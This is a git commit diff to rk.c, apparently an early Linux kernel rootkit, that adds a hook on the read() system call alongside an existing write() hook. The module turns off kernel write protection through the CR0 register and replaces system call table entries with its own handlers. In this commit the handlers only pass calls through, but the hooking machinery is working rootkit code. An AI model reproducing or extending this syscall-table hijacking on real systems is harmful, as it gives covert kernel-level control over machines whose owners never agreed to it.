516dd7cab8b724041203f15399103551d8981aa8
Tyler L <tslimkemann42@gmail.com>
2016-06-24 02:12:11 -0700

    added read hook

--- rk.c
+++ rk.c
@@ -9,25 +9,35 @@
 #define unBitMe() write_cr0(read_cr0() | 0x10000)
 
 asmlinkage int (*original_write)(unsigned int, const char __user *, size_t);
-
 asmlinkage int rk_write(unsigned int fd, const char __user* buf, size_t count) {
-	printk(KERN_INFO "writing to %i, string %s", fd, buf);
 	return (*original_write)(fd, buf, count);
+}
+
+asmlinkage int (*original_read)(unsigned int, void __user*, size_t);
+asmlinkage int rk_read(unsigned int fd, void __user* buf, size_t count) {
+	return (*original_read)(fd, buf, count);
 }
 
 static int __init rk_init(void) {
 	printk(KERN_INFO "Hello, from hell.\n");
 	printk(KERN_ALERT "System call table at %p\n", SYS_CALL_TABLE);
 	bitMe();
+	//hook write()
 	original_write = (void*)SYS_CALL_TABLE[__NR_write];
 	SYS_CALL_TABLE[__NR_write] = (unsigned long*)rk_write;
+	//hook read();
+	original_read = (void*)SYS_CALL_TABLE[__NR_read];
+	SYS_CALL_TABLE[__NR_read] = (unsigned long*)rk_read;
 	unBitMe();
 	return 0;
 }
 
 static void __exit rk_exit(void) {
 	bitMe();
+	//unhook write()
 	SYS_CALL_TABLE[__NR_write] = (unsigned long*)original_write;
+	//unhook read()
+	SYS_CALL_TABLE[__NR_read] = (unsigned long*)original_read;
 	unBitMe();
 	printk(KERN_INFO "Cya dawg.");
 }
